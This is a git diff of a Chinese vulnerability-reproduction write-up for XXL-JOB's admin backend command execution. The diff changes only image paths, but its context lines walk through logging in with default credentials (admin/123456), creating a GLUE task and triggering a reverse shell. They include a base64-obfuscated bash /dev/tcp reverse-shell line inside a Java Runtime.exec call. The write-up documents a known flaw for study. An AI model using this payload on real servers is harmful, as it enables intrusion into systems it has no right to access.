@@ -43,7 +43,7 @@ docker run -e PARAMS="--spring.datasource.url=jdbc:mysql://容器所在宿主机
 
 打开浏览器输入： `http://容器所在宿主机IP地址:9080/xxl-job-admin` ，即可访问
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled.png)
+![Untitled](image/Untitled.png)
 
 ## 0x05 漏洞复现
 
@@ -55,48 +55,48 @@ docker run -e PARAMS="--spring.datasource.url=jdbc:mysql://容器所在宿主机
 
 账号密码：admin/123456
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%201.png)
+![Untitled](image/Untitled%201.png)
 
 任务管理新增任务
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%202.png)
+![Untitled](image/Untitled%202.png)
 
 点击新增任务，按照下图填写后，保存
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%203.png)
+![Untitled](image/Untitled%203.png)
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%204.png)
+![Untitled](image/Untitled%204.png)
 
 选择GLUE IDE, 写入反弹shell的命令
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%205.png)
+![Untitled](image/Untitled%205.png)
 
 保存后
 
 攻击机在命令行界面监听8989端口即可
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%206.png)
+![Untitled](image/Untitled%206.png)
 
 xxl-job任务管理界面，对刚才创建的任务进行操作，选择点击执行一次
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%207.png)
+![Untitled](image/Untitled%207.png)
 
 反弹shell成功
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%208.png)
+![Untitled](image/Untitled%208.png)
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%209.png)
+![Untitled](image/Untitled%209.png)
 
 运行模式为GLUE(Java)时反弹shell的操作与GLUE(Shell)相同
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%2010.png)
+![Untitled](image/Untitled%2010.png)
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%2011.png)
+![Untitled](image/Untitled%2011.png)
 
 ```
 Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguODEuMTgyLzg5ODkgMD4mMQ==}|{base64,-d}|{bash,-i}");
 ```
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%2012.png)
+![Untitled](image/Untitled%2012.png)
 
-![Untitled](XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20259d91df95f84e9b88e2bd8ead19a3f4/Untitled%2013.png)
+![Untitled](image/Untitled%2013.png)
